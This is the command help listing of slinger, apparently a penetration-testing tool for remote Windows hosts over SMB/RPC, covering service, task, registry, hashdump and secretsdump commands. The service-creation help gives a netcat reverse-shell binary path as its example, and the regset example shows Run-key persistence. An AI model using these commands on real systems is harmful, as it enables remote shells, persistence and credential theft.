🤠 (10.0.0.41):\\> help all

======= Command: use =======
usage: slinger use [-h] share

Connect to a specific share on the remote server

positional arguments:
  share       Specify the share name to connect to

options:
  -h, --help  show this help message and exit

Example Usage: use sharename

======= Command: ls =======
usage: slinger ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [-sr] [-l] [path]

List contents of a directory at a specified path

positional arguments:
  path                  Path to list contents, defaults to current path

options:
  -h, --help            show this help message and exit
  -s {name,size,created,lastaccess,lastwrite}, --sort {name,size,created,lastaccess,lastwrite}
                        Sort the directory contents by name, size, or date
  -sr, --sort-reverse   Reverse the sort order
  -l, --long            Display long format listing

Example Usage: ls /path/to/directory

======= Command: shares =======
usage: slinger shares [-h]

List all shares available on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: shares

======= Command: enumshares =======
usage: slinger shares [-h]

List all shares available on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: shares

======= Command: cat =======
usage: slinger cat [-h] remote_path

Display the contents of a specified file on the remote server

positional arguments:
  remote_path  Specify the remote file path to display contents

options:
  -h, --help   show this help message and exit

Example Usage: cat /path/to/file

======= Command: cd =======
usage: slinger cd [-h] [path]

Change to a different directory on the remote server

positional arguments:
  path        Directory path to change to, defaults to current directory

options:
  -h, --help  show this help message and exit

Example Usage: cd /path/to/directory

======= Command: pwd =======
usage: slinger pwd [-h]

Print the current working directory on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: pwd

======= Command: exit =======
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

======= Command: quit =======
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

======= Command: logout =======
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

======= Command: logoff =======
usage: slinger exit [-h]

Exit the application

options:
  -h, --help  show this help message and exit

Example Usage: exit

======= Command: help =======
usage: slinger help [-h] [cmd]

Display help information for the application

positional arguments:
  cmd         Specify a command to show help for

options:
  -h, --help  show this help message and exit

Example Usage: help

======= Command: who =======
usage: slinger who [-h]

List the current sessions connected to the target host

options:
  -h, --help  show this help message and exit

Example Usage: who

======= Command: enumdisk =======
usage: slinger enumdisk [-h]

Enumerate server disk information

options:
  -h, --help  show this help message and exit

Example Usage: enumdisk

======= Command: enumlogons =======
usage: slinger enumlogons [-h]

Enumerate users currently logged on the server

options:
  -h, --help  show this help message and exit

Example Usage: enumlogons

======= Command: enuminfo =======
usage: slinger enuminfo [-h]

Enumerate detailed information about the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enuminfo

======= Command: enumsys =======
usage: slinger enumsys [-h]

Enumerate system information of the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enumsys

======= Command: enumtransport =======
usage: slinger enumtransport [-h]

Enumerate transport information of the remote host

options:
  -h, --help  show this help message and exit

Example Usage: enumtransport

======= Command: enumservices =======
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

======= Command: servicesenum =======
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

======= Command: svcenum =======
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

======= Command: services =======
usage: slinger enumservices [-h] [-n] [--filter FILTER]

Enumerate services on the remote host

options:
  -h, --help       show this help message and exit
  -n, --new        Perform a new enumeration of services even if already enumerated
  --filter FILTER  Filter services by name or state

Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n

======= Command: serviceshow =======
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

======= Command: svcshow =======
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

======= Command: showservice =======
usage: slinger serviceshow [-h] (-i SERVICEID | service_name)

Show details of a specific service on the remote server

positional arguments:
  service_name          Specify the name of the service to show

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to show details for

Example Usage: serviceshow -i 123

======= Command: servicestart =======
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

======= Command: svcstart =======
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

======= Command: servicerun =======
usage: slinger servicestart [-h] (-i SERVICEID | service_name)

Start a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to start

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to start

Example Usage: servicestart -i 123 OR svcstart Spooler

======= Command: servicestop =======
usage: slinger servicestop [-h] (-i SERVICEID | service_name)

Stop a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to stop

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to stop

Example Usage: servicestop -i 123 OR svcstop Spooler

======= Command: svcstop =======
usage: slinger servicestop [-h] (-i SERVICEID | service_name)

Stop a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to stop

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to stop

Example Usage: servicestop -i 123 OR svcstop Spooler

======= Command: serviceenable =======
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

======= Command: svcenable =======
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

======= Command: enableservice =======
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

======= Command: enablesvc =======
usage: slinger serviceenable [-h] (-i SERVICEID | service_name)

Enable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to enable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to enable

Example Usage: serviceenable -i 123 OR svcenable Spooler

======= Command: servicedisable =======
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

======= Command: svcdisable =======
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

======= Command: disableservice =======
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

======= Command: disablesvc =======
usage: slinger servicedisable [-h] (-i SERVICEID | service_name)

Disable a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to disable

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to disable

Example Usage: servicedisable -i 123 OR svcdisable Spooler

======= Command: servicedel =======
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

======= Command: svcdelete =======
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

======= Command: servicedelete =======
usage: slinger servicedel [-h] (-i SERVICEID | service_name)

Delete a specified service on the remote server

positional arguments:
  service_name          Specify the name of the service to delete

options:
  -h, --help            show this help message and exit
  -i SERVICEID, --serviceid SERVICEID
                        Specify the ID of the service to delete

Example Usage: servicedelete -i 123 OR svcdelete Spooler

======= Command: serviceadd =======
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

======= Command: svcadd =======
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

======= Command: servicecreate =======
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

======= Command: svccreate =======
usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}

Create a new service on the remote server

options:
  -h, --help            show this help message and exit
  -n SERVICENAME, --servicename SERVICENAME
                        Specify the name of the new service
  -b BINARYPATH, --binarypath BINARYPATH
                        Specify the binary path of the new service
  -d DISPLAYNAME, --displayname DISPLAYNAME
                        Specify the display name of the new service
  -s {auto,demand,system}, --starttype {auto,demand,system}
                        Specify the start type of the new service

Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"

======= Command: enumtasks =======
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

======= Command: tasksenum =======
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

======= Command: taskenum =======
usage: slinger enumtasks [-h]

Enumerate scheduled tasks on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: enumtasks

======= Command: taskshow =======
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

======= Command: tasksshow =======
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

======= Command: showtask =======
usage: slinger taskshow [-h] (-i TASKID | task_path)

Show details of a specific task on the remote server

positional arguments:
  task_path             Specify the full path of the task to show

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to show

Example Usage: tasksshow -i 123

======= Command: taskcreate =======
usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]

Create a new scheduled task on the remote server

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  Specify the name of the new task
  -p PROGRAM, --program PROGRAM
                        Specify the program to run (cmd.exe)
  -a ARGUMENTS, --arguments ARGUMENTS
                        Specify the arguments to pass to the program
  -f FOLDER, --folder FOLDER
                        Specify the folder to create the task in
  -i INTERVAL, --interval INTERVAL
                        Specify an interval in minutes to run the task
  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)

Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows

======= Command: taskadd =======
usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]

Create a new scheduled task on the remote server

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  Specify the name of the new task
  -p PROGRAM, --program PROGRAM
                        Specify the program to run (cmd.exe)
  -a ARGUMENTS, --arguments ARGUMENTS
                        Specify the arguments to pass to the program
  -f FOLDER, --folder FOLDER
                        Specify the folder to create the task in
  -i INTERVAL, --interval INTERVAL
                        Specify an interval in minutes to run the task
  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)

Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows

======= Command: taskrun =======
usage: slinger taskrun [-h] task_path

Run a specified task on the remote server

positional arguments:
  task_path   Specify the full path of the task to run

options:
  -h, --help  show this help message and exit

Example Usage: taskrun \\Windows\\newtask

======= Command: taskexec =======
usage: slinger taskrun [-h] task_path

Run a specified task on the remote server

positional arguments:
  task_path   Specify the full path of the task to run

options:
  -h, --help  show this help message and exit

Example Usage: taskrun \\Windows\\newtask

======= Command: taskdelete =======
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

======= Command: taskdel =======
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

======= Command: taskrm =======
usage: slinger taskdelete [-h] [-i TASKID] [task_path]

Delete a specified task on the remote server

positional arguments:
  task_path             Specify the full path of the task to delete

options:
  -h, --help            show this help message and exit
  -i TASKID, --taskid TASKID
                        Specify the ID of the task to delete

Example Usage: taskdelete -i 123

======= Command: enumtime =======
usage: slinger enumtime [-h]

Get the current time on the server

options:
  -h, --help  show this help message and exit

Example Usage: enumtime

======= Command: upload =======
usage: slinger upload [-h] local_path [remote_path]

Upload a file to the remote server

positional arguments:
  local_path   Specify the local file path to upload
  remote_path  Specify the remote file path to upload to, optional

options:
  -h, --help   show this help message and exit

Example Usage: upload /local/path /remote/path

======= Command: put =======
usage: slinger upload [-h] local_path [remote_path]

Upload a file to the remote server

positional arguments:
  local_path   Specify the local file path to upload
  remote_path  Specify the remote file path to upload to, optional

options:
  -h, --help   show this help message and exit

Example Usage: upload /local/path /remote/path

======= Command: download =======
usage: slinger download [-h] remote_path [local_path]

Download a file from the remote server

positional arguments:
  remote_path  Specify the remote file path to download
  local_path   Specify the local file path to download to, optional

options:
  -h, --help   show this help message and exit

Example Usage: download /remote/path /local/path

======= Command: get =======
usage: slinger download [-h] remote_path [local_path]

Download a file from the remote server

positional arguments:
  remote_path  Specify the remote file path to download
  local_path   Specify the local file path to download to, optional

options:
  -h, --help   show this help message and exit

Example Usage: download /remote/path /local/path

======= Command: mget =======
usage: slinger mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]

Download all files from a specified directory and its subdirectories

positional arguments:
  remote_path  Specify the remote directory path to download from
  local_path   Specify the local directory path where files will be downloaded

options:
  -h, --help   show this help message and exit
  -r           Recurse into directories
  -p regex     Specify a regex pattern to match filenames
  -d D         Specify folder depth count for recursion

Example Usage: mget /remote/path /local/path

======= Command: mkdir =======
usage: slinger mkdir [-h] path

Create a new directory on the remote server

positional arguments:
  path        Specify the path of the directory to create

options:
  -h, --help  show this help message and exit

Example Usage: mkdir /path/to/new/directory

======= Command: rmdir =======
usage: slinger rmdir [-h] remote_path

Remove a directory on the remote server

positional arguments:
  remote_path  Specify the remote path of the directory to remove

options:
  -h, --help   show this help message and exit

Example Usage: rmdir /path/to/remote/directory

======= Command: rm =======
usage: slinger rm [-h] remote_path

Delete a file on the remote server

positional arguments:
  remote_path  Specify the remote file path to delete

options:
  -h, --help   show this help message and exit

Example Usage: rm /path/to/remote/file

======= Command: #shell =======
usage: slinger #shell [-h]

Enter local terminal mode for command execution

options:
  -h, --help  show this help message and exit

Example Usage: #shell

======= Command: ! =======
usage: slinger ! [-h] ...

Run a specified local command

positional arguments:
  commands    Specify the local commands to run

options:
  -h, --help  show this help message and exit

Example Usage: ! ls -l

======= Command: info =======
usage: slinger info [-h]

Display the status of the current session

options:
  -h, --help  show this help message and exit

Example Usage: info

======= Command: reguse =======
usage: slinger reguse [-h]

Connect to a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: reguse

======= Command: regstart =======
usage: slinger reguse [-h]

Connect to a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: reguse

======= Command: regstop =======
usage: slinger regstop [-h]

Disconnect from a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: regstop

======= Command: regquery =======
usage: slinger regquery [-h] [-l] [-v] key

Query a registry key on the remote server

positional arguments:
  key          Specify the registry key to query

options:
  -h, --help   show this help message and exit
  -l, --list   List all subkeys in the registry key
  -v, --value  Enumerate the value of the specified registry key

Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

======= Command: regset =======
usage: slinger regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]

Set a registry value on the remote server

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Specify the registry key to set
  -v VALUE, --value VALUE
                        Specify the registry value to set
  -d DATA, --data DATA  Specify the registry data to set
  -t TYPE, --type TYPE  Specify the registry type to set

Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"

======= Command: regdel =======
usage: slinger regdel [-h] -k KEY [-v VALUE]

Delete a registry value on the remote server

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Specify the registry key to delete
  -v VALUE, --value VALUE
                        Specify the registry value to delete

Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test

======= Command: regcreate =======
usage: slinger regcreate [-h] key

Create a registry key on the remote server

positional arguments:
  key         Specify the registry key to create

options:
  -h, --help  show this help message and exit

Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test

======= Command: regcheck =======
usage: slinger regcheck [-h] key

Check if a registry key exists on the remote server. This is really just an exposed helper function.

positional arguments:
  key         Specify the registry key to check

options:
  -h, --help  show this help message and exit

Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test

======= Command: portfwd =======
usage: slinger portfwd [-h] (-d | -a | -l | -c | --load) local remote

Forward a local port to a remote port on the remote server

positional arguments:
  local         Specify the local host and port to forward from
  remote        Specify the remote host and port to forward to

options:
  -h, --help    show this help message and exit
  -d, --remove  Remove a port forwarding rule
  -a, --add     Add a port forwarding rule
  -l, --list    List all port forwarding rules
  -c, --clear   Clear all port forwarding rules
  --load        Load all port forwarding rules from the registry

Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]

======= Command: ifconfig =======
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

======= Command: ipconfig =======
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

======= Command: enuminterfaces =======
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

======= Command: hostname =======
usage: slinger hostname [-h]

Display the hostname of the remote server

options:
  -h, --help  show this help message and exit

Example Usage: hostname

======= Command: procs =======
usage: slinger procs [-h]

List running processes on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: procs

======= Command: ps =======
usage: slinger procs [-h]

List running processes on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: procs

======= Command: tasklist =======
usage: slinger procs [-h]

List running processes on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: procs

======= Command: fwrules =======
usage: slinger fwrules [-h]

Display firewall rules on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: fwrules

======= Command: set =======
usage: slinger set [-h] varname value

Set a variable for use in the application

positional arguments:
  varname     Set the debug variable to True or False
  value       Set the mode variable to True or False

options:
  -h, --help  show this help message and exit

Example Usage: set varname value

======= Command: config =======
usage: slinger config [-h]

Show the current config

options:
  -h, --help  show this help message and exit

Example Usage: config

======= Command: run =======
usage: slinger run [-h] (-c CMD_CHAIN | -f FILE)

Run a slinger script or command sequence

options:
  -h, --help            show this help message and exit
  -c CMD_CHAIN, --cmd_chain CMD_CHAIN
                        Specify a command sequence to run
  -f FILE, --file FILE  Specify a script file to run

Example Usage: run -c|-f [script]

======= Command: hashdump =======
usage: slinger hashdump [-h]

Dump hashes from the remote server

options:
  -h, --help  show this help message and exit

Example Usage: hashdump

======= Command: secretsdump =======
usage: slinger secretsdump [-h]

Dump secrets from the remote server

options:
  -h, --help  show this help message and exit

Example Usage: secretsdump

======= Command: env =======
usage: slinger env [-h]

Display environment variables on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: env

======= Command: debug-availcounters =======
usage: slinger debug-availcounters [-h] [-f FILTER]

Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.

options:
  -h, --help            show this help message and exit
  -f FILTER, --filter FILTER
                        Simple filter for case insenstive counters containing a given string

Example Usage: availcounters

======= Command: debug-counter =======
usage: slinger debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}]

Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.

options:
  -h, --help            show this help message and exit
  -c COUNTER, --counter COUNTER
                        Specify the counter to display
  -a {x86,x64,unk}, --arch {x86,x64,unk}
                        Specify the architecture of the remote server

Example Usage: counter -c 123 [-a x86]

======= Command: reload =======
usage: slinger reload [-h]

Reload the current sessions context

options:
  -h, --help  show this help message and exit

Example Usage: reload

======= Command: plugincmd =======
usage: slinger plugincmd [-h] [--plugincmd PLUGINCMD]

options:
  -h, --help            show this help message and exit
  --plugincmd PLUGINCMD
                        My plugin argument